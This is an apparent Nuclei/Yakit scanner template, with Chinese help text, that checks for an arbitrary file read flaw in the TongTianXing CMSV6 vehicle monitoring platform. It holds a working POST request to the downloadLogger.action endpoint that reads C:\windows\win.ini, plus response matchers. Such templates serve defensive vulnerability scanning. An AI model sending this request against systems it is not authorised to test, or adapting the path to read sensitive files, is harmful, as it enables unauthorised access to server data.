script_name: TongTianXing CMS V6 downloadLogger.action Arbitrary File Read
content:
id: tongtianxing-cms-v6-file-read

info:
  name: TongTianXing CMS V6 downloadLogger.action Arbitrary File Read
  author: hyy
  severity: high
  description: |
    通天星CMSV6车载监控平台存在任意文件读取漏洞，攻击者可通过 downloadLogger.action 接口读取系统敏感文件（如 C:\Windows\win.ini）。
    影响版本：CMSV6（未打补丁版本）
  reference:
    - https://example.com/vuln/tiantianxing-cms-v6-file-read
    - https://www.cnblogs.com/xxx/p/xxxxxx.html
  tags: cve,iot,gps,vehicle,arbitrary-file-read

requests:
  - method: POST
    path:
      - "{{BaseURL}}/808gps/logger/downloadLogger.action"
    headers:
      Content-Type: application/x-www-form-urlencoded
      User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5666.197 Safari/537.36
      Connection: close
    body: 'fileName=C:\\windows\\win.ini'
    matchers:
      - type: word
        words:
          - "[fonts]"
          - "[extensions]"
          - "[Mail]"
          - "32bit"
        part: body
      - type: status
        status:
          - 200
    matchers-condition: and
params: "[{\"Field\":\"target\",\"TypeVerbose\":\"string\",\"FieldVerbose\":\"扫描目标\",\"Help\":\"扫描目标可接受：主机名 / 主机名:端口 / IP段 / URL 等多种格式\",\"Required\":true},{\"Field\":\"reverse-url\",\"TypeVerbose\":\"string\",\"FieldVerbose\":\"反连 URL\",\"Help\":\"可使用 InteractshURL 也可使用 Yakit Reverse URL\"},{\"Field\":\"debug\",\"TypeVerbose\":\"boolean\",\"FieldVerbose\":\"设置调试模式\",\"Help\":\"开启调试模式，调试模式将输出尽量多的调试信息\"},{\"Field\":\"proxy\",\"TypeVerbose\":\"proxy\",\"FieldVerbose\":\"HTTP 代理\",\"Help\":\"设置 HTTP 代理\"}]"
help:
通天星CMSV6车载监控平台存在任意文件读取漏洞，攻击者可通过 downloadLogger.action 接口读取系统敏感文件（如 C:\Windows\win.ini）。
影响版本：CMSV6（未打补丁版本）
